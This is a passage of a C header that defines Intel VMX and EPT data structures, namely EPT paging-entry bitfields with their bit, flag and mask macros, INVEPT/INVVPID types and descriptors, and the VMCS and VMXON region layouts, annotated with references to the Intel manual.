         * by this entry. Ignored if bit 6 of EPTP is 0.
         *
         * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
         */
        UINT64 Dirty : 1;
#define EPDPTE_1GB_DIRTY_BIT                                         9
#define EPDPTE_1GB_DIRTY_FLAG                                        0x200
#define EPDPTE_1GB_DIRTY_MASK                                        0x01
#define EPDPTE_1GB_DIRTY(_)                                          (((_) >> 9) & 0x01)

        /**
         * [Bit 10] Execute access for user-mode linear addresses. If the "mode-based execute control for EPT" VM-execution control
         * is 1, indicates whether instruction fetches are allowed from user-mode linear addresses in the 1-GByte page controlled
         * by this entry. If that control is 0, this bit is ignored.
         */
        UINT64 UserModeExecute : 1;
#define EPDPTE_1GB_USER_MODE_EXECUTE_BIT                             10
#define EPDPTE_1GB_USER_MODE_EXECUTE_FLAG                            0x400
#define EPDPTE_1GB_USER_MODE_EXECUTE_MASK                            0x01
#define EPDPTE_1GB_USER_MODE_EXECUTE(_)                              (((_) >> 10) & 0x01)
        UINT64 Reserved1 : 19;

        /**
         * [Bits 47:30] Physical address of 4-KByte aligned EPT page-directory-pointer table referenced by this entry.
         */
        UINT64 PageFrameNumber : 18;
#define EPDPTE_1GB_PAGE_FRAME_NUMBER_BIT                             30
#define EPDPTE_1GB_PAGE_FRAME_NUMBER_FLAG                            0xFFFFC0000000
#define EPDPTE_1GB_PAGE_FRAME_NUMBER_MASK                            0x3FFFF
#define EPDPTE_1GB_PAGE_FRAME_NUMBER(_)                              (((_) >> 30) & 0x3FFFF)
        UINT64 Reserved2 : 15;

        /**
         * [Bit 63] Suppress \#VE. If the "EPT-violation \#VE" VM-execution control is 1, EPT violations caused by accesses to this
         * page are convertible to virtualization exceptions only if this bit is 0. If "EPT-violation \#VE" VMexecution control is
         * 0, this bit is ignored.
         *
         * @see Vol3C[25.5.6.1(Convertible EPT Violations)]
         */
        UINT64 SuppressVe : 1;
#define EPDPTE_1GB_SUPPRESS_VE_BIT                                   63
#define EPDPTE_1GB_SUPPRESS_VE_FLAG                                  0x8000000000000000
#define EPDPTE_1GB_SUPPRESS_VE_MASK                                  0x01
#define EPDPTE_1GB_SUPPRESS_VE(_)                                    (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} EPDPTE_1GB;

/**
 * @brief Format of an EPT Page-Directory-Pointer-Table Entry (PDPTE) that References an EPT Page Directory
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Read access; indicates whether reads are allowed from the 1-GByte region controlled by this entry.
         */
        UINT64 ReadAccess : 1;
#define EPDPTE_READ_ACCESS_BIT                                       0
#define EPDPTE_READ_ACCESS_FLAG                                      0x01
#define EPDPTE_READ_ACCESS_MASK                                      0x01
#define EPDPTE_READ_ACCESS(_)                                        (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Write access; indicates whether writes are allowed from the 1-GByte region controlled by this entry.
         */
        UINT64 WriteAccess : 1;
#define EPDPTE_WRITE_ACCESS_BIT                                      1
#define EPDPTE_WRITE_ACCESS_FLAG                                     0x02
#define EPDPTE_WRITE_ACCESS_MASK                                     0x01
#define EPDPTE_WRITE_ACCESS(_)                                       (((_) >> 1) & 0x01)

        /**
         * [Bit 2] If the "mode-based execute control for EPT" VM-execution control is 0, execute access; indicates whether
         * instruction fetches are allowed from the 1-GByte region controlled by this entry.
         * If that control is 1, execute access for supervisor-mode linear addresses; indicates whether instruction fetches are
         * allowed from supervisor-mode linear addresses in the 1-GByte region controlled by this entry.
         */
        UINT64 ExecuteAccess : 1;
#define EPDPTE_EXECUTE_ACCESS_BIT                                    2
#define EPDPTE_EXECUTE_ACCESS_FLAG                                   0x04
#define EPDPTE_EXECUTE_ACCESS_MASK                                   0x01
#define EPDPTE_EXECUTE_ACCESS(_)                                     (((_) >> 2) & 0x01)
        UINT64 Reserved1 : 5;

        /**
         * [Bit 8] If bit 6 of EPTP is 1, accessed flag for EPT; indicates whether software has accessed the 1-GByte region
         * controlled by this entry. Ignored if bit 6 of EPTP is 0.
         *
         * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
         */
        UINT64 Accessed : 1;
#define EPDPTE_ACCESSED_BIT                                          8
#define EPDPTE_ACCESSED_FLAG                                         0x100
#define EPDPTE_ACCESSED_MASK                                         0x01
#define EPDPTE_ACCESSED(_)                                           (((_) >> 8) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * [Bit 10] Execute access for user-mode linear addresses. If the "mode-based execute control for EPT" VM-execution control
         * is 1, indicates whether instruction fetches are allowed from user-mode linear addresses in the 1-GByte region controlled
         * by this entry. If that control is 0, this bit is ignored.
         */
        UINT64 UserModeExecute : 1;
#define EPDPTE_USER_MODE_EXECUTE_BIT                                 10
#define EPDPTE_USER_MODE_EXECUTE_FLAG                                0x400
#define EPDPTE_USER_MODE_EXECUTE_MASK                                0x01
#define EPDPTE_USER_MODE_EXECUTE(_)                                  (((_) >> 10) & 0x01)
        UINT64 Reserved3 : 1;

        /**
         * [Bits 47:12] Physical address of 4-KByte aligned EPT page-directory-pointer table referenced by this entry.
         */
        UINT64 PageFrameNumber : 36;
#define EPDPTE_PAGE_FRAME_NUMBER_BIT                                 12
#define EPDPTE_PAGE_FRAME_NUMBER_FLAG                                0xFFFFFFFFF000
#define EPDPTE_PAGE_FRAME_NUMBER_MASK                                0xFFFFFFFFF
#define EPDPTE_PAGE_FRAME_NUMBER(_)                                  (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved4 : 16;
    };

    UINT64 Flags;
} EPDPTE;

/**
 * @brief Format of an EPT Page-Directory Entry (PDE) that Maps a 2-MByte Page
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Read access; indicates whether reads are allowed from the 2-MByte page referenced by this entry.
         */
        UINT64 ReadAccess : 1;
#define EPDE_2MB_READ_ACCESS_BIT                                     0
#define EPDE_2MB_READ_ACCESS_FLAG                                    0x01
#define EPDE_2MB_READ_ACCESS_MASK                                    0x01
#define EPDE_2MB_READ_ACCESS(_)                                      (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Write access; indicates whether writes are allowed from the 2-MByte page referenced by this entry.
         */
        UINT64 WriteAccess : 1;
#define EPDE_2MB_WRITE_ACCESS_BIT                                    1
#define EPDE_2MB_WRITE_ACCESS_FLAG                                   0x02
#define EPDE_2MB_WRITE_ACCESS_MASK                                   0x01
#define EPDE_2MB_WRITE_ACCESS(_)                                     (((_) >> 1) & 0x01)

        /**
         * [Bit 2] If the "mode-based execute control for EPT" VM-execution control is 0, execute access; indicates whether
         * instruction fetches are allowed from the 2-MByte page controlled by this entry.
         * If that control is 1, execute access for supervisor-mode linear addresses; indicates whether instruction fetches are
         * allowed from supervisor-mode linear addresses in the 2-MByte page controlled by this entry.
         */
        UINT64 ExecuteAccess : 1;
#define EPDE_2MB_EXECUTE_ACCESS_BIT                                  2
#define EPDE_2MB_EXECUTE_ACCESS_FLAG                                 0x04
#define EPDE_2MB_EXECUTE_ACCESS_MASK                                 0x01
#define EPDE_2MB_EXECUTE_ACCESS(_)                                   (((_) >> 2) & 0x01)

        /**
         * [Bits 5:3] EPT memory type for this 2-MByte page.
         *
         * @see Vol3C[28.2.6(EPT and memory Typing)]
         */
        UINT64 MemoryType : 3;
#define EPDE_2MB_MEMORY_TYPE_BIT                                     3
#define EPDE_2MB_MEMORY_TYPE_FLAG                                    0x38
#define EPDE_2MB_MEMORY_TYPE_MASK                                    0x07
#define EPDE_2MB_MEMORY_TYPE(_)                                      (((_) >> 3) & 0x07)

        /**
         * [Bit 6] Ignore PAT memory type for this 2-MByte page.
         *
         * @see Vol3C[28.2.6(EPT and memory Typing)]
         */
        UINT64 IgnorePat : 1;
#define EPDE_2MB_IGNORE_PAT_BIT                                      6
#define EPDE_2MB_IGNORE_PAT_FLAG                                     0x40
#define EPDE_2MB_IGNORE_PAT_MASK                                     0x01
#define EPDE_2MB_IGNORE_PAT(_)                                       (((_) >> 6) & 0x01)

        /**
         * [Bit 7] Must be 1 (otherwise, this entry references an EPT page table).
         */
        UINT64 LargePage : 1;
#define EPDE_2MB_LARGE_PAGE_BIT                                      7
#define EPDE_2MB_LARGE_PAGE_FLAG                                     0x80
#define EPDE_2MB_LARGE_PAGE_MASK                                     0x01
#define EPDE_2MB_LARGE_PAGE(_)                                       (((_) >> 7) & 0x01)

        /**
         * [Bit 8] If bit 6 of EPTP is 1, accessed flag for EPT; indicates whether software has accessed the 2-MByte page
         * referenced by this entry. Ignored if bit 6 of EPTP is 0.
         *
         * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
         */
        UINT64 Accessed : 1;
#define EPDE_2MB_ACCESSED_BIT                                        8
#define EPDE_2MB_ACCESSED_FLAG                                       0x100
#define EPDE_2MB_ACCESSED_MASK                                       0x01
#define EPDE_2MB_ACCESSED(_)                                         (((_) >> 8) & 0x01)

        /**
         * [Bit 9] If bit 6 of EPTP is 1, dirty flag for EPT; indicates whether software has written to the 2-MByte page referenced
         * by this entry. Ignored if bit 6 of EPTP is 0.
         *
         * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
         */
        UINT64 Dirty : 1;
#define EPDE_2MB_DIRTY_BIT                                           9
#define EPDE_2MB_DIRTY_FLAG                                          0x200
#define EPDE_2MB_DIRTY_MASK                                          0x01
#define EPDE_2MB_DIRTY(_)                                            (((_) >> 9) & 0x01)

        /**
         * [Bit 10] Execute access for user-mode linear addresses. If the "mode-based execute control for EPT" VM-execution control
         * is 1, indicates whether instruction fetches are allowed from user-mode linear addresses in the 2-MByte page controlled
         * by this entry. If that control is 0, this bit is ignored.
         */
        UINT64 UserModeExecute : 1;
#define EPDE_2MB_USER_MODE_EXECUTE_BIT                               10
#define EPDE_2MB_USER_MODE_EXECUTE_FLAG                              0x400
#define EPDE_2MB_USER_MODE_EXECUTE_MASK                              0x01
#define EPDE_2MB_USER_MODE_EXECUTE(_)                                (((_) >> 10) & 0x01)
        UINT64 Reserved1 : 10;

        /**
         * [Bits 47:21] Physical address of 4-KByte aligned EPT page-directory-pointer table referenced by this entry.
         */
        UINT64 PageFrameNumber : 27;
#define EPDE_2MB_PAGE_FRAME_NUMBER_BIT                               21
#define EPDE_2MB_PAGE_FRAME_NUMBER_FLAG                              0xFFFFFFE00000
#define EPDE_2MB_PAGE_FRAME_NUMBER_MASK                              0x7FFFFFF
#define EPDE_2MB_PAGE_FRAME_NUMBER(_)                                (((_) >> 21) & 0x7FFFFFF)
        UINT64 Reserved2 : 15;

        /**
         * [Bit 63] Suppress \#VE. If the "EPT-violation \#VE" VM-execution control is 1, EPT violations caused by accesses to this
         * page are convertible to virtualization exceptions only if this bit is 0. If "EPT-violation \#VE" VMexecution control is
         * 0, this bit is ignored.
         *
         * @see Vol3C[25.5.6.1(Convertible EPT Violations)]
         */
        UINT64 SuppressVe : 1;
#define EPDE_2MB_SUPPRESS_VE_BIT                                     63
#define EPDE_2MB_SUPPRESS_VE_FLAG                                    0x8000000000000000
#define EPDE_2MB_SUPPRESS_VE_MASK                                    0x01
#define EPDE_2MB_SUPPRESS_VE(_)                                      (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} EPDE_2MB;

/**
 * @brief Format of an EPT Page-Directory Entry (PDE) that References an EPT Page Table
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Read access; indicates whether reads are allowed from the 2-MByte region controlled by this entry.
         */
        UINT64 ReadAccess : 1;
#define EPDE_READ_ACCESS_BIT                                         0
#define EPDE_READ_ACCESS_FLAG                                        0x01
#define EPDE_READ_ACCESS_MASK                                        0x01
#define EPDE_READ_ACCESS(_)                                          (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Write access; indicates whether writes are allowed from the 2-MByte region controlled by this entry.
         */
        UINT64 WriteAccess : 1;
#define EPDE_WRITE_ACCESS_BIT                                        1
#define EPDE_WRITE_ACCESS_FLAG                                       0x02
#define EPDE_WRITE_ACCESS_MASK                                       0x01
#define EPDE_WRITE_ACCESS(_)                                         (((_) >> 1) & 0x01)

        /**
         * [Bit 2] If the "mode-based execute control for EPT" VM-execution control is 0, execute access; indicates whether
         * instruction fetches are allowed from the 2-MByte region controlled by this entry.
         * If that control is 1, execute access for supervisor-mode linear addresses; indicates whether instruction fetches are
         * allowed from supervisor-mode linear addresses in the 2-MByte region controlled by this entry.
         */
        UINT64 ExecuteAccess : 1;
#define EPDE_EXECUTE_ACCESS_BIT                                      2
#define EPDE_EXECUTE_ACCESS_FLAG                                     0x04
#define EPDE_EXECUTE_ACCESS_MASK                                     0x01
#define EPDE_EXECUTE_ACCESS(_)                                       (((_) >> 2) & 0x01)
        UINT64 Reserved1 : 5;

        /**
         * [Bit 8] If bit 6 of EPTP is 1, accessed flag for EPT; indicates whether software has accessed the 2-MByte region
         * controlled by this entry. Ignored if bit 6 of EPTP is 0.
         *
         * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
         */
        UINT64 Accessed : 1;
#define EPDE_ACCESSED_BIT                                            8
#define EPDE_ACCESSED_FLAG                                           0x100
#define EPDE_ACCESSED_MASK                                           0x01
#define EPDE_ACCESSED(_)                                             (((_) >> 8) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * [Bit 10] Execute access for user-mode linear addresses. If the "mode-based execute control for EPT" VM-execution control
         * is 1, indicates whether instruction fetches are allowed from user-mode linear addresses in the 2-MByte region controlled
         * by this entry. If that control is 0, this bit is ignored.
         */
        UINT64 UserModeExecute : 1;
#define EPDE_USER_MODE_EXECUTE_BIT                                   10
#define EPDE_USER_MODE_EXECUTE_FLAG                                  0x400
#define EPDE_USER_MODE_EXECUTE_MASK                                  0x01
#define EPDE_USER_MODE_EXECUTE(_)                                    (((_) >> 10) & 0x01)
        UINT64 Reserved3 : 1;

        /**
         * [Bits 47:12] Physical address of 4-KByte aligned EPT page table referenced by this entry.
         */
        UINT64 PageFrameNumber : 36;
#define EPDE_PAGE_FRAME_NUMBER_BIT                                   12
#define EPDE_PAGE_FRAME_NUMBER_FLAG                                  0xFFFFFFFFF000
#define EPDE_PAGE_FRAME_NUMBER_MASK                                  0xFFFFFFFFF
#define EPDE_PAGE_FRAME_NUMBER(_)                                    (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved4 : 16;
    };

    UINT64 Flags;
} EPDE;

/**
 * @brief Format of an EPT Page-Table Entry that Maps a 4-KByte Page
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Read access; indicates whether reads are allowed from the 4-KByte page referenced by this entry.
         */
        UINT64 ReadAccess : 1;
#define EPTE_READ_ACCESS_BIT                                         0
#define EPTE_READ_ACCESS_FLAG                                        0x01
#define EPTE_READ_ACCESS_MASK                                        0x01
#define EPTE_READ_ACCESS(_)                                          (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Write access; indicates whether writes are allowed from the 4-KByte page referenced by this entry.
         */
        UINT64 WriteAccess : 1;
#define EPTE_WRITE_ACCESS_BIT                                        1
#define EPTE_WRITE_ACCESS_FLAG                                       0x02
#define EPTE_WRITE_ACCESS_MASK                                       0x01
#define EPTE_WRITE_ACCESS(_)                                         (((_) >> 1) & 0x01)

        /**
         * [Bit 2] If the "mode-based execute control for EPT" VM-execution control is 0, execute access; indicates whether
         * instruction fetches are allowed from the 4-KByte page controlled by this entry.
         * If that control is 1, execute access for supervisor-mode linear addresses; indicates whether instruction fetches are
         * allowed from supervisor-mode linear addresses in the 4-KByte page controlled by this entry.
         */
        UINT64 ExecuteAccess : 1;
#define EPTE_EXECUTE_ACCESS_BIT                                      2
#define EPTE_EXECUTE_ACCESS_FLAG                                     0x04
#define EPTE_EXECUTE_ACCESS_MASK                                     0x01
#define EPTE_EXECUTE_ACCESS(_)                                       (((_) >> 2) & 0x01)

        /**
         * [Bits 5:3] EPT memory type for this 4-KByte page.
         *
         * @see Vol3C[28.2.6(EPT and memory Typing)]
         */
        UINT64 MemoryType : 3;
#define EPTE_MEMORY_TYPE_BIT                                         3
#define EPTE_MEMORY_TYPE_FLAG                                        0x38
#define EPTE_MEMORY_TYPE_MASK                                        0x07
#define EPTE_MEMORY_TYPE(_)                                          (((_) >> 3) & 0x07)

        /**
         * [Bit 6] Ignore PAT memory type for this 4-KByte page.
         *
         * @see Vol3C[28.2.6(EPT and memory Typing)]
         */
        UINT64 IgnorePat : 1;
#define EPTE_IGNORE_PAT_BIT                                          6
#define EPTE_IGNORE_PAT_FLAG                                         0x40
#define EPTE_IGNORE_PAT_MASK                                         0x01
#define EPTE_IGNORE_PAT(_)                                           (((_) >> 6) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * [Bit 8] If bit 6 of EPTP is 1, accessed flag for EPT; indicates whether software has accessed the 4-KByte page
         * referenced by this entry. Ignored if bit 6 of EPTP is 0.
         *
         * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
         */
        UINT64 Accessed : 1;
#define EPTE_ACCESSED_BIT                                            8
#define EPTE_ACCESSED_FLAG                                           0x100
#define EPTE_ACCESSED_MASK                                           0x01
#define EPTE_ACCESSED(_)                                             (((_) >> 8) & 0x01)

        /**
         * [Bit 9] If bit 6 of EPTP is 1, dirty flag for EPT; indicates whether software has written to the 4-KByte page referenced
         * by this entry. Ignored if bit 6 of EPTP is 0.
         *
         * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
         */
        UINT64 Dirty : 1;
#define EPTE_DIRTY_BIT                                               9
#define EPTE_DIRTY_FLAG                                              0x200
#define EPTE_DIRTY_MASK                                              0x01
#define EPTE_DIRTY(_)                                                (((_) >> 9) & 0x01)

        /**
         * [Bit 10] Execute access for user-mode linear addresses. If the "mode-based execute control for EPT" VM-execution control
         * is 1, indicates whether instruction fetches are allowed from user-mode linear addresses in the 4-KByte page controlled
         * by this entry. If that control is 0, this bit is ignored.
         */
        UINT64 UserModeExecute : 1;
#define EPTE_USER_MODE_EXECUTE_BIT                                   10
#define EPTE_USER_MODE_EXECUTE_FLAG                                  0x400
#define EPTE_USER_MODE_EXECUTE_MASK                                  0x01
#define EPTE_USER_MODE_EXECUTE(_)                                    (((_) >> 10) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * [Bits 47:12] Physical address of the 4-KByte page referenced by this entry.
         */
        UINT64 PageFrameNumber : 36;
#define EPTE_PAGE_FRAME_NUMBER_BIT                                   12
#define EPTE_PAGE_FRAME_NUMBER_FLAG                                  0xFFFFFFFFF000
#define EPTE_PAGE_FRAME_NUMBER_MASK                                  0xFFFFFFFFF
#define EPTE_PAGE_FRAME_NUMBER(_)                                    (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved3 : 15;

        /**
         * [Bit 63] Suppress \#VE. If the "EPT-violation \#VE" VM-execution control is 1, EPT violations caused by accesses to this
         * page are convertible to virtualization exceptions only if this bit is 0. If "EPT-violation \#VE" VMexecution control is
         * 0, this bit is ignored.
         *
         * @see Vol3C[25.5.6.1(Convertible EPT Violations)]
         */
        UINT64 SuppressVe : 1;
#define EPTE_SUPPRESS_VE_BIT                                         63
#define EPTE_SUPPRESS_VE_FLAG                                        0x8000000000000000
#define EPTE_SUPPRESS_VE_MASK                                        0x01
#define EPTE_SUPPRESS_VE(_)                                          (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} EPTE;

/**
 * @brief Format of a common EPT Entry
 */
typedef union
{
    struct
    {
        UINT64 ReadAccess : 1;
#define EPT_ENTRY_READ_ACCESS_BIT                                    0
#define EPT_ENTRY_READ_ACCESS_FLAG                                   0x01
#define EPT_ENTRY_READ_ACCESS_MASK                                   0x01
#define EPT_ENTRY_READ_ACCESS(_)                                     (((_) >> 0) & 0x01)
        UINT64 WriteAccess : 1;
#define EPT_ENTRY_WRITE_ACCESS_BIT                                   1
#define EPT_ENTRY_WRITE_ACCESS_FLAG                                  0x02
#define EPT_ENTRY_WRITE_ACCESS_MASK                                  0x01
#define EPT_ENTRY_WRITE_ACCESS(_)                                    (((_) >> 1) & 0x01)
        UINT64 ExecuteAccess : 1;
#define EPT_ENTRY_EXECUTE_ACCESS_BIT                                 2
#define EPT_ENTRY_EXECUTE_ACCESS_FLAG                                0x04
#define EPT_ENTRY_EXECUTE_ACCESS_MASK                                0x01
#define EPT_ENTRY_EXECUTE_ACCESS(_)                                  (((_) >> 2) & 0x01)
        UINT64 MemoryType : 3;
#define EPT_ENTRY_MEMORY_TYPE_BIT                                    3
#define EPT_ENTRY_MEMORY_TYPE_FLAG                                   0x38
#define EPT_ENTRY_MEMORY_TYPE_MASK                                   0x07
#define EPT_ENTRY_MEMORY_TYPE(_)                                     (((_) >> 3) & 0x07)
        UINT64 IgnorePat : 1;
#define EPT_ENTRY_IGNORE_PAT_BIT                                     6
#define EPT_ENTRY_IGNORE_PAT_FLAG                                    0x40
#define EPT_ENTRY_IGNORE_PAT_MASK                                    0x01
#define EPT_ENTRY_IGNORE_PAT(_)                                      (((_) >> 6) & 0x01)
        UINT64 LargePage : 1;
#define EPT_ENTRY_LARGE_PAGE_BIT                                     7
#define EPT_ENTRY_LARGE_PAGE_FLAG                                    0x80
#define EPT_ENTRY_LARGE_PAGE_MASK                                    0x01
#define EPT_ENTRY_LARGE_PAGE(_)                                      (((_) >> 7) & 0x01)
        UINT64 Accessed : 1;
#define EPT_ENTRY_ACCESSED_BIT                                       8
#define EPT_ENTRY_ACCESSED_FLAG                                      0x100
#define EPT_ENTRY_ACCESSED_MASK                                      0x01
#define EPT_ENTRY_ACCESSED(_)                                        (((_) >> 8) & 0x01)
        UINT64 Dirty : 1;
#define EPT_ENTRY_DIRTY_BIT                                          9
#define EPT_ENTRY_DIRTY_FLAG                                         0x200
#define EPT_ENTRY_DIRTY_MASK                                         0x01
#define EPT_ENTRY_DIRTY(_)                                           (((_) >> 9) & 0x01)
        UINT64 UserModeExecute : 1;
#define EPT_ENTRY_USER_MODE_EXECUTE_BIT                              10
#define EPT_ENTRY_USER_MODE_EXECUTE_FLAG                             0x400
#define EPT_ENTRY_USER_MODE_EXECUTE_MASK                             0x01
#define EPT_ENTRY_USER_MODE_EXECUTE(_)                               (((_) >> 10) & 0x01)
        UINT64 Reserved1 : 1;
        UINT64 PageFrameNumber : 36;
#define EPT_ENTRY_PAGE_FRAME_NUMBER_BIT                              12
#define EPT_ENTRY_PAGE_FRAME_NUMBER_FLAG                             0xFFFFFFFFF000
#define EPT_ENTRY_PAGE_FRAME_NUMBER_MASK                             0xFFFFFFFFF
#define EPT_ENTRY_PAGE_FRAME_NUMBER(_)                               (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved2 : 15;
        UINT64 SuppressVe : 1;
#define EPT_ENTRY_SUPPRESS_VE_BIT                                    63
#define EPT_ENTRY_SUPPRESS_VE_FLAG                                   0x8000000000000000
#define EPT_ENTRY_SUPPRESS_VE_MASK                                   0x01
#define EPT_ENTRY_SUPPRESS_VE(_)                                     (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} EPT_ENTRY;

/**
 * @defgroup EPT_TABLE_LEVEL \
 *           EPT Table level numbers
 *
 * EPT Table level numbers.
 * @{
 */
#define EPT_LEVEL_PML4E                                              0x00000003
#define EPT_LEVEL_PDPTE                                              0x00000002
#define EPT_LEVEL_PDE                                                0x00000001
#define EPT_LEVEL_PTE                                                0x00000000
 /**
  * @}
  */

  /**
   * @defgroup EPT_ENTRY_COUNT \
   *           EPT Entry counts
   *
   * EPT Entry counts.
   * @{
   */
#define EPT_PML4E_ENTRY_COUNT                                        0x00000200
#define EPT_PDPTE_ENTRY_COUNT                                        0x00000200
#define EPT_PDE_ENTRY_COUNT                                          0x00000200
#define EPT_PTE_ENTRY_COUNT                                          0x00000200
   /**
    * @}
    */

    /**
     * @}
     */

typedef enum
{
    /**
     * If the INVEPT type is 1, the logical processor invalidates all guest-physical mappings and combined mappings associated
     * with the EP4TA specified in the INVEPT descriptor. Combined mappings for that EP4TA are invalidated for all VPIDs and
     * all PCIDs. (The instruction may invalidate mappings associated with other EP4TAs.)
     */
    InveptSingleContext = 0x00000001,

    /**
     * If the INVEPT type is 2, the logical processor invalidates guest-physical mappings and combined mappings associated with
     * all EP4TAs (and, for combined mappings, for all VPIDs and PCIDs).
     */
    InveptAllContext = 0x00000002,
} INVEPT_TYPE;

typedef enum
{
    /**
     * If the INVVPID type is 0, the logical processor invalidates linear mappings and combined mappings associated with the
     * VPID specified in the INVVPID descriptor and that would be used to translate the linear address specified in of the
     * INVVPID descriptor. Linear mappings and combined mappings for that VPID and linear address are invalidated for all PCIDs
     * and, for combined mappings, all EP4TAs. (The instruction may also invalidate mappings associated with other VPIDs and
     * for other linear addresses).
     */
    InvvpidIndividualAddress = 0x00000000,

    /**
     * If the INVVPID type is 1, the logical processor invalidates all linear mappings and combined mappings associated with
     * the VPID specified in the INVVPID descriptor. Linear mappings and combined mappings for that VPID are invalidated for
     * all PCIDs and, for combined mappings, all EP4TAs. (The instruction may also invalidate mappings associated with other
     * VPIDs).
     */
    InvvpidSingleContext = 0x00000001,

    /**
     * If the INVVPID type is 2, the logical processor invalidates linear mappings and combined mappings associated with all
     * VPIDs except VPID 0000H and with all PCIDs. (The instruction may also invalidate linear mappings with VPID 0000H.)
     * Combined mappings are invalidated for all EP4TAs.
     */
    InvvpidAllContext = 0x00000002,

    /**
     * If the INVVPID type is 3, the logical processor invalidates linear mappings and combined mappings associated with the
     * VPID specified in the INVVPID descriptor. Linear mappings and combined mappings for that VPID are invalidated for all
     * PCIDs and, for combined mappings, all EP4TAs. The logical processor is not required to invalidate information that was
     * used for global translations (although it may do so). (The instruction may also invalidate mappings associated with
     * other VPIDs).
     *
     * @see Vol3C[4.10(Caching Translation Information)]
     */
    InvvpidSingleContextRetainingGlobals = 0x00000003,
} INVVPID_TYPE;

typedef struct
{
    UINT64 EptPointer;

    /**
     * Must be zero.
     */
    UINT64 Reserved;
} INVEPT_DESCRIPTOR;

typedef struct
{
    UINT16 Vpid;

    /**
     * Must be zero.
     */
    UINT16 Reserved1;

    /**
     * Must be zero.
     */
    UINT32 Reserved2;
    UINT64 LinearAddress;
} INVVPID_DESCRIPTOR;

/**
 * @brief Format of the VMCS Region
 *
 * A logical processor uses virtual-machine control data structures (VMCSs) while it is in VMX operation. These manage
 * transitions into and out of VMX non-root operation (VM entries and VM exits) as well as processor behavior in VMX
 * non-root operation. This structure is manipulated by the new instructions VMCLEAR, VMPTRLD, VMREAD, and VMWRITE.
 * A VMCS region comprises up to 4-KBytes. The exact size is implementation specific and can be determined by consulting
 * the VMX capability MSR IA32_VMX_BASIC.
 *
 * @see Vol3C[24.2(FORMAT OF THE VMCS REGION)] (reference)
 */
typedef struct
{
    struct
    {
        /**
         * @brief VMCS revision identifier
         *
         * [Bits 30:0] Processors that maintain VMCS data in different formats (see below) use different VMCS revision identifiers.
         * These identifiers enable software to avoid using a VMCS region formatted for one processor on a processor that uses a
         * different format.
         * Software should write the VMCS revision identifier to the VMCS region before using that region for a VMCS. The VMCS
         * revision identifier is never written by the processor; VMPTRLD fails if its operand references a VMCS region whose VMCS
         * revision identifier differs from that used by the processor.
         * Software can discover the VMCS revision identifier that a processor uses by reading the VMX capability MSR
         * IA32_VMX_BASIC.
         *
         * @see Vol3C[24.6.2(Processor-Based VM-Execution Controls)]
         * @see Vol3D[A.1(BASIC VMX INFORMATION)]
         */
        UINT32 RevisionId : 31;

        /**
         * @brief Shadow-VMCS indicator
         *
         * [Bit 31] Software should clear or set the shadow-VMCS indicator depending on whether the VMCS is to be an ordinary VMCS
         * or a shadow VMCS. VMPTRLD fails if the shadow-VMCS indicator is set and the processor does not support the 1-setting of
         * the "VMCS shadowing" VM-execution control. Software can discover support for this setting by reading the VMX capability
         * MSR IA32_VMX_PROCBASED_CTLS2.
         *
         * @see Vol3C[24.10(VMCS TYPES ORDINARY AND SHADOW)]
         */
        UINT32 ShadowVmcsIndicator : 1;
    };


    /**
     * @brief VMX-abort indicator
     *
     * The contents of these bits do not control processor operation in any way. A logical processor writes a non-zero value
     * into these bits if a VMX abort occurs. Software may also write into this field.
     *
     * @see Vol3D[27.7(VMX Aborts)]
     */
    UINT32 AbortIndicator;

    /**
     * @brief VMCS data (implementation-specific format)
     *
     * These parts of the VMCS control VMX non-root operation and the VMX transitions.
     * The format of these data is implementation-specific. To ensure proper behavior in VMX operation, software should
     * maintain the VMCS region and related structures in writeback cacheable memory. Future implementations may allow or
     * require a different memory type. Software should consult the VMX capability MSR IA32_VMX_BASIC.
     *
     * @see Vol3C[24.11.4(Software Access to Related Structures)]
     * @see Vol3D[A.1(BASIC VMX INFORMATION)]
     */
    UINT8 Data[4088];
} VMCS;

/**
 * @brief Format of the VMXON Region
 *
 * Before executing VMXON, software allocates a region of memory that the logical processor uses to support VMX operation.
 * This region is called the VMXON region.
 * A VMXON region comprises up to 4-KBytes. The exact size is implementation specific and can be determined by consulting
 * the VMX capability MSR IA32_VMX_BASIC.
 *
 * @see Vol3C[24.11.5(VMXON Region)] (reference)
 */
typedef struct
{
    struct
    {
        /**
         * @brief VMCS revision identifier
         *
         * [Bits 30:0] Before executing VMXON, software should write the VMCS revision identifier to the VMXON region.
         * (Specifically, it should write the 31-bit VMCS revision identifier to bits 30:0 of the first 4 bytes of the VMXON
         * region; bit 31 should be cleared to 0.)
         *
         * @see VMCS
         * @see Vol3C[24.2(FORMAT OF THE VMCS REGION)]
         * @see Vol3C[24.11.5(VMXON Region)]
         */
        UINT32 RevisionId : 31;

        /**
         * [Bit 31] Bit 31 is always 0.
         */
        UINT32 MustBeZero : 1;
    };


    /**
     * @brief VMXON data (implementation-specific format)
     *
     * The format of these data is implementation-specific. To ensure proper behavior in VMX operation, software should not
     * access or modify the VMXON region of a logical processor between execution of VMXON and VMXOFF on that logical
     * processor. Doing otherwise may lead to unpredictable behavior.
     *
